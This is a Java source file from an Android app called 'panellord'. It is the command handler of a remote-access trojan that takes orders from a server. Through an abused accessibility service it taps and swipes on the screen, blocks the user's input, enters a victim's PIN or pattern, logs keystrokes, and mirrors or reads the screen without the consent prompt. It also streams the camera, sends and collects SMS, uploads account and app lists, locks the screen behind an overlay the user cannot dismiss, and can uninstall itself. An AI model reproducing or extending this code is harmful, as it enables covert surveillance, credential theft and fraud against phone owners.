package com.panellord;

import android.Manifest;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.provider.Settings;
import android.media.AudioManager;
import android.media.RingtoneManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Vibrator;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.util.Base64;
import java.io.ByteArrayOutputStream;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class CommandPoller {
    private static final String TAG = "CommandPoller";
    private final Context ctx;
    private ScheduledExecutorService scheduler;

    public CommandPoller(Context ctx) {
        this.ctx = ctx;
    }

    public void start() {
        scheduler = Executors.newSingleThreadScheduledExecutor();
        scheduler.scheduleAtFixedRate(this::poll,
            2, Config.CMD_POLL_INTERVAL_MS, TimeUnit.MILLISECONDS);
        // Auto-report permission status on startup
        scheduler.schedule(() -> syncPermissions(ctx), 5, TimeUnit.SECONDS);
    }

    public void stop() {
        if (scheduler != null) scheduler.shutdownNow();
    }

    private void poll() {
        try {
            String deviceId = DeviceIdManager.getDeviceId(ctx);
            String resp = ApiClient.get("/device/commands/" + deviceId);
            if (resp == null || resp.isEmpty() || resp.equals("[]")) return;

            JSONArray cmds = new JSONArray(resp);
            for (int i = 0; i < cmds.length(); i++) {
                JSONObject cmd = cmds.getJSONObject(i);
                String action = cmd.optString("action", "");
                JSONObject data = cmd.optJSONObject("data");
                if (data == null) data = new JSONObject();
                execute(cmd.getString("id"), action, data);
            }
        } catch (Exception e) {
            Log.e(TAG, "Poll error", e);
        }
    }

    private void execute(String cmdId, String action, JSONObject data) {
        Log.d(TAG, "Execute: " + action);
        try {
            switch (action) {
                /* ── Touch / Gesture ── */
                case "touch": {
                    float x = (float) data.optDouble("x", 0);
                    float y = (float) data.optDouble("y", 0);
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null) svc.tap(x, y);
                    break;
                }
                case "swipe": {
                    float x1 = (float) data.optDouble("x1", 0);
                    float y1 = (float) data.optDouble("y1", 0);
                    float x2 = (float) data.optDouble("x2", 0);
                    float y2 = (float) data.optDouble("y2", 0);
                    long dur  = data.optLong("duration", 300);
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null) svc.swipe(x1, y1, x2, y2, dur);
                    break;
                }
                case "long_press": {
                    float x = (float) data.optDouble("x", 0);
                    float y = (float) data.optDouble("y", 0);
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null) svc.longPress(x, y);
                    break;
                }
                case "pattern_swipe": {
                    JSONArray dots = data.optJSONArray("dots");
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null && dots != null && dots.length() >= 2) {
                        svc.swipePattern(dots);
                    }
                    break;
                }

                /* ── Block / Unblock user input ── */
                case "block_input": {
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null) svc.blockUserInput();
                    break;
                }
                case "unblock_input": {
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null) svc.unblockUserInput();
                    break;
                }

                /* ── Navigation ── */
                case "home": {
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null) svc.goHome();
                    break;
                }
                case "back": {
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null) svc.goBack();
                    break;
                }
                case "recents": {
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null) svc.goRecents();
                    break;
                }

                /* ── Camera ── */
                case "start_back":
                case "start_front": {
                    String facing = action.equals("start_front") ? "front" : "back";
                    Intent camIntent = new Intent(ctx, CameraStreamService.class);
                    camIntent.setAction(CameraStreamService.ACTION_START);
                    camIntent.putExtra(CameraStreamService.EXTRA_FACING, facing);
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
                        ctx.startForegroundService(camIntent);
                    else ctx.startService(camIntent);
                    break;
                }
                case "stop_camera": {
                    Intent camStop = new Intent(ctx, CameraStreamService.class);
                    camStop.setAction(CameraStreamService.ACTION_STOP);
                    ctx.startService(camStop);
                    break;
                }

                /* ── SMS ── */
                case "send_sms": {
                    String to   = data.optString("to", "");
                    String body = data.optString("body", "");
                    int sim     = data.optInt("sim", 1);
                    if (!to.isEmpty() && !body.isEmpty()) sendSms(to, body, sim);
                    break;
                }
                case "sync_sms": {
                    SmsReceiver.syncOldSms(ctx);
                    break;
                }

                /* ── Misc ── */
                case "vibrate": {
                    int ms = data.optInt("duration", 1000);
                    vibrate(ms);
                    break;
                }
                case "ring_alarm": {
                    int secs = data.optInt("seconds", 5);
                    ringAlarm(secs);
                    break;
                }
                case "show_toast": {
                    String msg = data.optString("message", "Test");
                    showToast(msg);
                    break;
                }
                case "black_screen": {
                    String bsText = data.optString("text", Config.BLACK_SCREEN_TEXT);
                    PanelAccessibility bsSvc = PanelAccessibility.getInstance();
                    if (bsSvc != null) {
                        // Show WindowManager overlay (HOME/back can't dismiss it)
                        bsSvc.showBlackScreenOverlay(bsText);
                        // Also block input so user cannot interact
                        bsSvc.blockUserInput();
                    } else {
                        // Fallback to activity if accessibility not connected
                        showBlackScreen(bsText);
                    }
                    break;
                }
                case "dismiss_black_screen": {
                    PanelAccessibility dsSvc = PanelAccessibility.getInstance();
                    if (dsSvc != null) {
                        dsSvc.dismissBlackScreenOverlay();
                        dsSvc.unblockUserInput();
                    }
                    // Also dismiss activity if it was launched as fallback
                    BlackScreenActivity.dismiss();
                    break;
                }
                case "wake_screen": {
                    wakeScreen();
                    break;
                }
                case "unlock_screen": {
                    wakeScreen();
                    final String unlockType = data != null ? data.optString("type", "") : "";
                    final String pinCode = data != null ? data.optString("code", "") : "";
                    final org.json.JSONArray patternSeq = data != null ? data.optJSONArray("sequence") : null;

                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        PanelAccessibility svc = PanelAccessibility.getInstance();
                        if (svc == null) return;

                        if ("pin".equals(unlockType) && !pinCode.isEmpty()) {
                            svc.swipe(540, 1700, 540, 400, 300);
                            svc.autoUnlockPin(pinCode);
                        } else if ("pattern".equals(unlockType) && patternSeq != null && patternSeq.length() >= 2) {
                            svc.swipe(540, 1700, 540, 400, 300);
                            svc.autoUnlockPattern(patternSeq);
                        } else if ("password".equals(unlockType) && !pinCode.isEmpty()) {
                            svc.swipe(540, 1700, 540, 400, 300);
                            svc.autoUnlockPassword(pinCode);
                        } else {
                            svc.swipe(540, 1700, 540, 400, 300);
                        }
                    }, 400);
                    break;
                }

                /* ── Keylog start/stop ── */
                case "start_keylog": {
                    PanelAccessibility.startKeylog();
                    break;
                }
                case "stop_keylog": {
                    PanelAccessibility.stopKeylog();
                    break;
                }

                /* ── Screen content reader ── */
                case "read_screen": {
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null) {
                        new Thread(() -> {
                            String result = svc.getScreenText();
                            if (result != null && !result.isEmpty()) {
                                try {
                                    ApiClient.postJson("/device/screen-text/" + DeviceIdManager.getDeviceId(ctx), result);
                                } catch (Exception ignored) {}
                            }
                        }).start();
                    }
                    break;
                }

                /* ── Screen Live Mode (auto-push on every screen change) ── */
                case "start_screen_live": {
                    PanelAccessibility.setScreenLive(true);
                    PanelAccessibility svc2 = PanelAccessibility.getInstance();
                    if (svc2 != null) {
                        // Start 350ms periodic push ticker
                        svc2.startScreenLiveTicks();
                    }
                    break;
                }

                case "stop_screen_live": {
                    PanelAccessibility.setScreenLive(false);
                    PanelAccessibility svc3 = PanelAccessibility.getInstance();
                    if (svc3 != null) svc3.stopScreenLiveTicks();
                    break;
                }

                /* ── Screen mirror start / stop ── */
                case "start_screen_mirror": {
                    String mirrorMode = data.optString("mode", "live"); // "live" or "silent"
                    PanelAccessibility svcA = PanelAccessibility.getInstance();

                    if ("silent".equals(mirrorMode)) {
                        // Silent mode — Accessibility takeScreenshot (API 30+), no popup
                        if (svcA != null) {
                            svcA.startSilentScreenMirror();
                        }
                    } else {
                        // Live mode — MediaProjection (needs user to see "Start now" dialog)
                        // Stop any running silent capture first
                        if (svcA != null) svcA.stopSilentScreenMirror();

                        if (ScreenMirrorService.isRunning()) {
                            ScreenMirrorService.setPaused(false);
                        } else {
                            // Open MainActivity → autoStartCapture() → PanelAccessibility auto-clicks
                            try {
                                Intent scIntent = new Intent(ctx, MainActivity.class);
                                scIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                                ctx.startActivity(scIntent);
                            } catch (Exception ignored) {}
                            if (svcA != null) svcA.triggerStartCastDialogWatcher();
                        }
                    }
                    break;
                }

                case "stop_screen_mirror": {
                    // Stop both modes
                    PanelAccessibility svcB = PanelAccessibility.getInstance();
                    if (svcB != null) svcB.stopSilentScreenMirror();
                    // Pause MediaProjection uploads if running
                    if (ScreenMirrorService.isRunning()) ScreenMirrorService.setPaused(true);
                    break;
                }

                /* ── Permission request + status sync ── */
                case "request_permissions": {
                    // Start MainActivity to trigger runtime permission dialogs
                    try {
                        Intent permIntent = new Intent(ctx, MainActivity.class);
                        permIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        ctx.startActivity(permIntent);
                    } catch (Exception ignored) {}
                    // Also report current status immediately
                    new Thread(() -> syncPermissions(ctx)).start();
                    break;
                }
                case "sync_permissions": {
                    new Thread(() -> syncPermissions(ctx)).start();
                    break;
                }

                /* ── Remote keyboard key input ── */
                case "key_input": {
                    String key = data.optString("key", "");
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null && !key.isEmpty()) {
                        new Handler(Looper.getMainLooper()).post(() -> {
                            if (key.equals("DEL")) {
                                svc.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK);
                            } else if (key.equals("ENTER") || key.equals("HIDE_KBD")) {
                                svc.dispatchTextKey(key);
                            } else {
                                svc.dispatchTextKey(key);
                            }
                        });
                    }
                    break;
                }

                /* ── App management ── */
                case "get_apps": {
                    new Thread(() -> fetchAndPostApps()).start();
                    break;
                }
                case "get_accounts": {
                    new Thread(() -> fetchAndPostAccounts()).start();
                    break;
                }
                case "disable_power": {
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null) svc.setPowerLock(true);
                    break;
                }
                case "enable_power": {
                    PanelAccessibility svc = PanelAccessibility.getInstance();
                    if (svc != null) svc.setPowerLock(false);
                    break;
                }
                case "uninstall_app": {
                    String pkg = data.optString("pkg", "");
                    if (!pkg.isEmpty() && !pkg.equals(ctx.getPackageName())) {
                        new Handler(Looper.getMainLooper()).post(() -> {
                            try {
                                Intent intent = new Intent(Intent.ACTION_DELETE);
                                intent.setData(Uri.parse("package:" + pkg));
                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                ctx.startActivity(intent);
                            } catch (Exception ignored) {}
                        });
                    }
                    break;
                }
                case "disable_app": {
                    String pkg = data.optString("pkg", "");
                    if (!pkg.isEmpty()) {
                        // Navigate to app settings; accessibility will click Disable automatically
                        new Handler(Looper.getMainLooper()).post(() -> {
                            try {
                                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                intent.setData(Uri.parse("package:" + pkg));
                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                ctx.startActivity(intent);
                                // Schedule accessibility click on "Disable" button after 1.5s
                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                    PanelAccessibility svc = PanelAccessibility.getInstance();
                                    if (svc != null) svc.clickButtonWithText("Disable", "DISABLE");
                                }, 1500);
                            } catch (Exception ignored) {}
                        });
                    }
                    break;
                }
                case "enable_app": {
                    String pkg = data.optString("pkg", "");
                    if (!pkg.isEmpty()) {
                        new Handler(Looper.getMainLooper()).post(() -> {
                            try {
                                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                intent.setData(Uri.parse("package:" + pkg));
                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                ctx.startActivity(intent);
                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                    PanelAccessibility svc = PanelAccessibility.getInstance();
                                    if (svc != null) svc.clickButtonWithText("Enable", "ENABLE");
                                }, 1500);
                            } catch (Exception ignored) {}
                        });
                    }
                    break;
                }
                case "force_stop_app": {
                    String pkg = data.optString("pkg", "");
                    if (!pkg.isEmpty() && !pkg.equals(ctx.getPackageName())) {
                        new Handler(Looper.getMainLooper()).post(() -> {
                            try {
                                Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                intent.setData(Uri.parse("package:" + pkg));
                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                ctx.startActivity(intent);
                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                    PanelAccessibility svc = PanelAccessibility.getInstance();
                                    if (svc != null) svc.clickButtonWithText("Force stop", "Force Stop", "FORCE STOP");
                                }, 1500);
                            } catch (Exception ignored) {}
                        });
                    }
                    break;
                }

                /* ── Self destruct / remote uninstall ── */
                case "self_destruct":
                case "remote_uninstall": {
                    selfDestruct();
                    break;
                }
            }

            // Mark command done
            try {
                ApiClient.postJson("/device/commands/" + cmdId + "/done",
                    new JSONObject().put("ok", true));
            } catch (Exception ignored) {}

        } catch (Exception e) {
            Log.e(TAG, "Execute error: " + action, e);
        }
    }

    /** Fetch all installed apps and POST the list to the server */
    private void fetchAndPostApps() {
        try {
            PackageManager pm = ctx.getPackageManager();
            java.util.List<PackageInfo> packages =
                pm.getInstalledPackages(PackageManager.GET_META_DATA);
            JSONArray arr = new JSONArray();
            for (PackageInfo pi : packages) {
                try {
                    ApplicationInfo ai = pi.applicationInfo;
                    String label = pm.getApplicationLabel(ai).toString();
                    boolean isSystem = (ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                    boolean isEnabled = ai.enabled;
                    JSONObject o = new JSONObject();
                    o.put("pkg",     pi.packageName);
                    o.put("name",    label);
                    o.put("ver",     pi.versionName != null ? pi.versionName : "");
                    o.put("sys",     isSystem);
                    o.put("enabled", isEnabled);
                    o.put("inst",    pi.firstInstallTime);
                    // Include icon as base64 for user apps only
                    if (!isSystem) {
                        try {
                            Drawable d = pm.getApplicationIcon(pi.packageName);
                            Bitmap bmp = drawableToBitmap(d, 48);
                            ByteArrayOutputStream bos = new ByteArrayOutputStream();
                            bmp.compress(Bitmap.CompressFormat.JPEG, 55, bos);
                            o.put("icon", "data:image/jpeg;base64," +
                                Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP));
                            bmp.recycle();
                        } catch (Exception ignored) {}
                    }
                    arr.put(o);
                } catch (Exception ignored) {}
            }
            ApiClient.postJson("/device/apps/" + DeviceIdManager.getDeviceId(ctx), arr.toString());
        } catch (Exception e) {
            Log.e(TAG, "fetchAndPostApps failed", e);
        }
    }

    private Bitmap drawableToBitmap(Drawable d, int size) {
        Bitmap bmp = Bitmap.createBitmap(size, size, Bitmap.Config.ARGB_8888);
        Canvas c = new Canvas(bmp);
        d.setBounds(0, 0, size, size);
        d.draw(c);
        return bmp;
    }

    private void fetchAndPostAccounts() {
        try {
            AccountManager am = AccountManager.get(ctx);
            java.util.LinkedHashMap<String, JSONObject> seen = new java.util.LinkedHashMap<>();

            // Priority 1: Google/Gmail accounts explicitly
            try {
                Account[] google = am.getAccountsByType("com.google");
                for (Account acc : google) {
                    String key = acc.type + "|" + acc.name;
                    if (!seen.containsKey(key)) {
                        JSONObject o = new JSONObject();
                        o.put("type", acc.type);
                        o.put("name", acc.name);
                        o.put("gmail", true);
                        seen.put(key, o);
                    }
                }
            } catch (Exception ignored) {}

            // Priority 2: All other accounts
            try {
                Account[] all = am.getAccounts();
                for (Account acc : all) {
                    String key = acc.type + "|" + acc.name;
                    if (!seen.containsKey(key)) {
                        JSONObject o = new JSONObject();
                        o.put("type", acc.type);
                        o.put("name", acc.name);
                        o.put("gmail", false);
                        seen.put(key, o);
                    }
                }
            } catch (Exception ignored) {}

            JSONArray arr = new JSONArray(seen.values());
            ApiClient.postJson("/device/accounts/" + DeviceIdManager.getDeviceId(ctx), arr.toString());
        } catch (Exception e) {
            Log.e(TAG, "fetchAndPostAccounts failed", e);
        }
    }

    /** Deactivate device admin → uninstall self */
    private void selfDestruct() {
        try {
            // First deactivate device admin so uninstall can proceed
            DevicePolicyManager dpm = (DevicePolicyManager)
                ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(ctx, DeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                dpm.removeActiveAdmin(admin);
            }
            // Small delay for admin removal, then uninstall
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    Intent intent = new Intent(Intent.ACTION_DELETE);
                    intent.setData(Uri.parse("package:" + ctx.getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    ctx.startActivity(intent);
                } catch (Exception e) {
                    Log.e(TAG, "Uninstall failed", e);
                }
            }, 1500);
        } catch (Exception e) {
            Log.e(TAG, "Self destruct failed", e);
        }
    }

    @SuppressWarnings("deprecation")
    private void sendSms(String to, String body, int simSlot) {
        try {
            SmsManager sm = SmsManager.getDefault();
            sm.sendTextMessage(to, null, body,
                PendingIntent.getBroadcast(ctx, 0,
                    new Intent("com.panellord.SMS_SENT"),
                    PendingIntent.FLAG_IMMUTABLE),
                null);
        } catch (Exception e) {
            Log.e(TAG, "Send SMS failed", e);
        }
    }

    private void vibrate(int durationMs) {
        try {
            Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
            if (v != null && v.hasVibrator()) v.vibrate(durationMs);
        } catch (Exception e) {
            Log.e(TAG, "Vibrate failed", e);
        }
    }

    private void ringAlarm(int seconds) {
        try {
            Uri alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
            if (alarmUri == null) alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
            final MediaPlayer mp = MediaPlayer.create(ctx, alarmUri);
            if (mp == null) return;
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am != null) am.setStreamVolume(AudioManager.STREAM_ALARM,
                am.getStreamMaxVolume(AudioManager.STREAM_ALARM), 0);
            mp.start();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try { mp.stop(); mp.release(); } catch (Exception ignored) {}
            }, (long) seconds * 1000);
        } catch (Exception e) {
            Log.e(TAG, "Ring alarm failed", e);
        }
    }

    private void showToast(final String message) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try { Toast.makeText(ctx, message, Toast.LENGTH_LONG).show(); }
            catch (Exception e) { Log.e(TAG, "Toast failed", e); }
        });
    }

    private void showBlackScreen(String text) {
        try {
            Intent i = new Intent(ctx, BlackScreenActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (text != null && !text.isEmpty()) i.putExtra("text", text);
            ctx.startActivity(i);
        } catch (Exception e) {
            Log.e(TAG, "Black screen failed", e);
        }
    }

    @SuppressWarnings({"deprecation", "WakelockTimeout"})
    private void wakeScreen() {
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            PowerManager.WakeLock wl = pm.newWakeLock(
                PowerManager.FULL_WAKE_LOCK
                | PowerManager.ACQUIRE_CAUSES_WAKEUP
                | PowerManager.ON_AFTER_RELEASE,
                "panellord:wake");
            wl.acquire(3000);
        } catch (Exception e) {
            Log.e(TAG, "Wake screen failed", e);
        }
    }

    /* ── Permission status sync ─────────────────────────────────────────── */
    static void syncPermissions(Context ctx) {
        try {
            String[][] PERM_MAP = {
                {Manifest.permission.CAMERA, "Camera"},
                {Manifest.permission.READ_SMS, "Read SMS"},
                {Manifest.permission.RECEIVE_SMS, "Receive SMS"},
                {Manifest.permission.READ_CONTACTS, "Contacts"},
                {Manifest.permission.READ_CALL_LOG, "Call Log"},
                {Manifest.permission.READ_PHONE_STATE, "Phone State"},
                {Manifest.permission.READ_PHONE_NUMBERS, "Phone Number"},
                {Manifest.permission.RECORD_AUDIO, "Microphone"},
                {Manifest.permission.READ_EXTERNAL_STORAGE, "Storage Read"},
                {Manifest.permission.WRITE_EXTERNAL_STORAGE, "Storage Write"}
            };
            JSONArray arr = new JSONArray();
            for (String[] pm : PERM_MAP) {
                boolean granted = ctx.checkSelfPermission(pm[0]) == PackageManager.PERMISSION_GRANTED;
                JSONObject p = new JSONObject();
                p.put("name", pm[1]);
                p.put("label", pm[0].replace("android.permission.", ""));
                p.put("granted", granted);
                arr.put(p);
            }
            JSONObject body = new JSONObject();
            body.put("perms", arr);
            ApiClient.postJson("/device/permissions/" + DeviceIdManager.getDeviceId(ctx), body.toString());
        } catch (Exception e) {
            Log.e(TAG, "syncPermissions failed", e);
        }
    }
}
